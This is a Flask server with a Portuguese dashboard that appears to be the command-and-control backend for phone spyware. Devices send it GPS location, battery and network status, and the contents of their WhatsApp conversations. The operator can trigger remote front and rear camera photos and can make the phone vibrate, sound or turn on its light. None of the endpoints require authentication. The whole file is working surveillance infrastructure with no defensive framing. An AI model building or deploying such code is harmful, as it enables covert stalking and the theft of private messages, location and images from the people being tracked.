import os
from flask import Flask, render_template_string, request, jsonify
from datetime import datetime
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

db_dispositivos = {}

HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXOS // PAINEL</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #0a0a0a; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 15px; }
        .wrapper { max-width: 900px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 20px; padding: 10px; border-bottom: 2px solid #1e293b; }
        .header h1 { font-size: 20px; color: #38bdf8; letter-spacing: 3px; }
        .search-box { background: #111; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 20px; }
        .search-box input { width: 100%; max-width: 300px; background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; color: #34d399; font-weight: bold; text-align: center; border-radius: 6px; font-size: 16px; margin-bottom: 15px; letter-spacing: 2px; }
        .search-box button { background: #38bdf8; color: #0a0a0a; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
        .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #111; padding: 15px; margin-bottom: 20px; }
        .device-title { font-size: 14px; color: #34d399; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 12px; display: flex; justify-content: space-between; }
        .info-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 12px; }
        @media(max-width: 600px) { .info-grid { grid-template-columns: 1fr 1fr; } }
        .info-box { background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; border-radius: 6px; text-align: center; }
        .info-box span { font-size: 10px; color: #64748b; display: block; text-transform: uppercase; margin-bottom: 4px; }
        .info-box strong { font-size: 18px; color: #f1f5f9; }
        .map-container { width: 100%; height: 300px; border-radius: 8px; border: 1px solid #1e293b; margin-bottom: 10px; }
        .btn-row { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
        .btn-maps { flex: 1; background: #22c55e; color: #fff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 11px; min-width: 70px; }
        .btn-cmd { background: #f59e0b; color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 11px; cursor: pointer; flex: 1; min-width: 70px; }
        .btn-camera { display: block; width: 100%; background: #38bdf8; color: #0a0a0a; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 10px; }
        .btn-camera:disabled { opacity: 0.5; cursor: not-allowed; }
        .cameras-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
        @media(max-width: 600px) { .cameras-row { grid-template-columns: 1fr; } }
        .cam-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; }
        .cam-card-title { background: #111; padding: 8px; font-size: 11px; color: #64748b; border-bottom: 1px solid #1e293b; font-weight: bold; text-transform: uppercase; }
        .cam-frame { width: 100%; aspect-ratio: 4/3; background: #000; display: flex; align-items: center; justify-content: center; }
        .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
        .cam-placeholder { font-size: 11px; color: #334155; text-transform: uppercase; }
        
        .whatsapp-section { margin-bottom: 15px; }
        .whatsapp-section h3 { color: #25d366; font-size: 13px; margin-bottom: 8px; text-transform: uppercase; }
        .chat-list { display: flex; flex-direction: column; gap: 6px; }
        .chat-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; cursor: pointer; }
        .chat-card:hover { border-color: #25d366; }
        .chat-card-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 12px; }
        .chat-card-header .pessoa { color: #25d366; font-weight: bold; font-size: 12px; }
        .chat-card-header .info { display: flex; gap: 10px; align-items: center; }
        .chat-card-header .total { background: #25d366; color: #000; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold; }
        .chat-card-header .ultima { color: #64748b; font-size: 10px; max-width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .chat-card-body { display: none; padding: 0 12px 10px 12px; max-height: 250px; overflow-y: auto; }
        .chat-card.aberto .chat-card-body { display: block; }
        .chat-msg { padding: 6px 0; border-bottom: 1px solid #1e293b; font-size: 11px; color: #94a3b8; }
        .chat-msg .hora { color: #64748b; font-size: 9px; }
        
        .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; }
        .error-box p { color: #fca5a5; font-weight: bold; }
        .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
        .status-online { background: #22c55e; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="header"><h1>NEXOS // PAINEL</h1></div>
        <div class="search-box">
            <p>DIGITE SEU ID PARA RASTREAR</p>
            <form method="POST">
                <input type="text" name="target_id" placeholder="EX: NX-A4B7D1" value="{{ id_buscado if id_buscado else '' }}" required><br>
                <button type="submit">Conectar</button>
            </form>
        </div>
        {% if erro %}<div class="error-box"><p>⚠️ {{ erro }}</p></div>{% endif %}
        {% if info_moto %}
            <div class="device-section">
                <div class="device-title">
                    <span><span class="status-dot status-online"></span> {{ id_buscado }}</span>
                    <span style="background: #166534; color: #4ade80; padding: 4px 10px; border-radius: 4px; font-size: 11px;">ONLINE</span>
                </div>
                <div class="info-grid">
                    <div class="info-box"><span>🔋 Bateria</span><strong id="txt_bateria" style="color: #22c55e;">{{ info_moto.battery }}%</strong></div>
                    <div class="info-box"><span>⏱️ Ativo</span><strong id="txt_uptime">{{ info_moto.get('uptime', '--') }}</strong></div>
                    <div class="info-box"><span>📶 Rede</span><strong id="txt_network">{{ info_moto.get('network', '--') }}</strong></div>
                </div>
                <div id="map_private" class="map-container"></div>
                <div class="btn-row">
                    <a id="lnk_maps" href="https://www.google.com/maps?q={{ info_moto.lat }},{{ info_moto.lon }}" target="_blank" class="btn-maps">🗺️ Maps</a>
                    <button class="btn-cmd" onclick="comando('vibrar')">📳</button>
                    <button class="btn-cmd" onclick="comando('som')">🔊</button>
                    <button class="btn-cmd" onclick="comando('lanterna')">💡</button>
                </div>
                <button id="btnCam" class="btn-camera" onclick="capturar()">📸 Capturar</button>
                
                <div class="whatsapp-section">
                    <h3>💬 WhatsApp</h3>
                    <div id="chatList" class="chat-list"><p style="color:#64748b;font-size:11px;">Nenhuma conversa</p></div>
                </div>
                
                <div class="cameras-row">
                    <div class="cam-card"><div class="cam-card-title">🎥 Frontal</div><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront" src="" alt="Frontal"></div></div>
                    <div class="cam-card"><div class="cam-card-title">🎥 Traseira</div><div class="cam-frame"><span id="labelBack" class="cam-placeholder">Sem Sinal</span><img id="imgBack" src="" alt="Traseira"></div></div>
                </div>
            </div>
            <script>
                var map = L.map('map_private').setView([{{ info_moto.lat }}, {{ info_moto.lon }}], 17);
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
                var marker = L.marker([{{ info_moto.lat }}, {{ info_moto.lon }}]).addTo(map);
                var linha = L.polyline([], {color: '#38bdf8'}).addTo(map);
                var pts = [[{{ info_moto.lat }}, {{ info_moto.lon }}]];
                var abertos = {};
                
                function comando(a) {
                    fetch('/api/comando_remoto/{{ id_buscado }}', {method:'POST',body:JSON.stringify({acao:a}),headers:{'Content-Type':'application/json'}});
                }
                
                function toggle(p, c) {
                    if(c.classList.contains('aberto')) { c.classList.remove('aberto'); delete abertos[p]; }
                    else { c.classList.add('aberto'); abertos[p] = true; }
                }
                
                function capturar() {
                    var b = document.getElementById('btnCam');
                    b.innerText = "⏳"; b.disabled = true;
                    fetch('/api/comando_camera/{{ id_buscado }}', {method:'POST',body:JSON.stringify({acao:'take_dual'}),headers:{'Content-Type':'application/json'}});
                    var t = 0;
                    var c = setInterval(function() {
                        fetch('/api/get_camera/{{ id_buscado }}').then(r=>r.json()).then(d=>{
                            if(d.photo_back) { document.getElementById('labelBack').style.display='none'; document.getElementById('imgBack').src='data:image/jpeg;base64,'+d.photo_back; document.getElementById('imgBack').style.display='block'; }
                            if(d.photo_front) { document.getElementById('labelFront').style.display='none'; document.getElementById('imgFront').src='data:image/jpeg;base64,'+d.photo_front; document.getElementById('imgFront').style.display='block'; }
                            if(d.pronto) { clearInterval(c); b.innerText = "📸 Capturar"; b.disabled = false; }
                        });
                        t++; if(t>40) { clearInterval(c); b.innerText = "📸 Capturar"; b.disabled = false; }
                    }, 1500);
                }
                
                function atualizar() {
                    fetch('/api/status/{{ id_buscado }}').then(r=>r.json()).then(d=>{
                        document.getElementById('txt_bateria').innerText = d.battery + '%';
                        document.getElementById('txt_uptime').innerText = d.uptime || '--';
                        document.getElementById('txt_network').innerText = d.network || '--';
                        
                        var lat = parseFloat(d.lat), lon = parseFloat(d.lon);
                        if(lat && lon && lat !== 0) {
                            marker.setLatLng([lat, lon]);
                            map.setView([lat, lon], map.getZoom());
                            document.getElementById('lnk_maps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
                            pts.push([lat, lon]);
                            linha.setLatLngs(pts);
                        }
                        
                        if(d.whatsapp && d.whatsapp.length > 0) {
                            var html = '';
                            d.whatsapp.forEach(function(chat) {
                                var ab = abertos[chat.pessoa] ? ' aberto' : '';
                                html += '<div class="chat-card'+ab+'" onclick="toggle(\''+chat.pessoa+'\',this)"><div class="chat-card-header"><span class="pessoa">👤 '+chat.pessoa+'</span><div class="info"><span class="ultima">'+(chat.midia?'📎 ':'')+(chat.ultima_msg||'')+'</span><span class="total">'+chat.total+'</span></div></div><div class="chat-card-body">';
                                if(chat.mensagens) chat.mensagens.slice().reverse().forEach(function(m){ html += '<div class="chat-msg">📥 '+m.texto+' <span class="hora">'+m.hora+'</span></div>'; });
                                html += '</div></div>';
                            });
                            document.getElementById('chatList').innerHTML = html;
                        }
                    });
                }
                
                atualizar();
                setInterval(atualizar, 3000);
            </script>
        {% endif %}
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    id_buscado = None; info_moto = None; erro = None
    if request.method == 'POST':
        id_buscado = request.form.get('target_id', '').strip().upper()
        if id_buscado in db_dispositivos: info_moto = db_dispositivos[id_buscado]
        else: erro = "ID NAO ENCONTRADO"
    return render_template_string(HTML_DASHBOARD_PRIVADO, id_buscado=id_buscado, info_moto=info_moto, erro=erro)

@app.route('/api/status/<device_id>')
def api_status(device_id):
    device_id = device_id.upper()
    if device_id in db_dispositivos:
        d = db_dispositivos[device_id]
        return jsonify({"battery": d.get("battery","N/A"), "uptime": d.get("uptime","N/A"), "lat": d.get("lat",0), "lon": d.get("lon",0), "network": d.get("network","N/A"), "whatsapp": d.get("whatsapp",[])}), 200
    return jsonify({"error": "Not found"}), 404

@app.route('/update', methods=['POST'])
def update():
    data = request.get_json(force=True, silent=True) or {}
    device_id = data.get('device_id', '').upper()
    if not device_id: return jsonify({"status": "error"}), 400
    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
    db_dispositivos[device_id].update({"battery": data.get("battery","N/A"), "uptime": data.get("uptime","N/A"), "lat": float(data.get("lat",-16.6869)), "lon": float(data.get("lon",-49.2648)), "network": data.get("network","N/A"), "whatsapp": data.get("whatsapp",[]), "last_seen": datetime.utcnow().isoformat()})
    cmd_cam = db_dispositivos[device_id].get("cmd_cam", "wait")
    cmd_remoto = db_dispositivos[device_id].get("cmd_remoto", "none")
    db_dispositivos[device_id]["cmd_cam"] = "wait"; db_dispositivos[device_id]["cmd_remoto"] = "none"
    return jsonify({"status": "success", "comando_cam": cmd_cam, "comando_remoto": cmd_remoto}), 200

@app.route('/api/comando_camera/<device_id>', methods=['POST'])
def comando_camera(device_id):
    device_id = device_id.upper()
    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
    db_dispositivos[device_id]["cmd_cam"] = "take_dual"
    db_dispositivos[device_id]["photo_front"] = ""; db_dispositivos[device_id]["photo_back"] = ""
    return jsonify({"status": "ok"}), 200

@app.route('/api/comando_remoto/<device_id>', methods=['POST'])
def comando_remoto(device_id):
    device_id = device_id.upper()
    if device_id not in db_dispositivos: db_dispositivos[device_id] = {}
    db_dispositivos[device_id]["cmd_remoto"] = (request.get_json(force=True, silent=True) or {}).get("acao", "none")
    return jsonify({"status": "ok"}), 200

@app.route('/api/upload_lote', methods=['POST'])
def upload_lote():
    data = request.get_json(force=True, silent=True) or {}
    dev_id = data.get("device_id", '').upper()
    if dev_id and dev_id in db_dispositivos:
        if data.get("photo_front"): db_dispositivos[dev_id]["photo_front"] = data["photo_front"]
        if data.get("photo_back"): db_dispositivos[dev_id]["photo_back"] = data["photo_back"]
        return jsonify({"status": "stored"}), 200
    return jsonify({"status": "error"}), 404

@app.route('/api/get_camera/<device_id>')
def get_camera(device_id):
    device_id = device_id.upper()
    if device_id in db_dispositivos:
        pf = db_dispositivos[device_id].get("photo_front", ""); pb = db_dispositivos[device_id].get("photo_back", "")
        return jsonify({"photo_front": pf, "photo_back": pb, "pronto": bool(pf and pb)}), 200
    return jsonify({"photo_front": "", "photo_back": "", "pronto": False}), 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)), debug=False)
